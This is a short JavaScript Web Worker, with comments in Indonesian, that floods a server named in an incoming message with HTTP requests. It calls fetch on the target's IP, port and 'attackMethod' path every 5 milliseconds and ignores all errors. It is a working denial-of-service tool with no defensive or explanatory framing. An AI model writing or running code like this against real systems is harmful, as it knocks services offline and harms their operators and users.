self.onmessage = function(event) {
    let { serverIP, serverPort, attackMethod } = event.data;

    function sendRequest() {
        fetch(`http://${serverIP}:${serverPort}/${attackMethod}`)
            .catch(() => {}); // Abaikan error jika server menolak request
    }

    setInterval(sendRequest, 5); // Kirim request setiap 5ms (Super cepat)
};
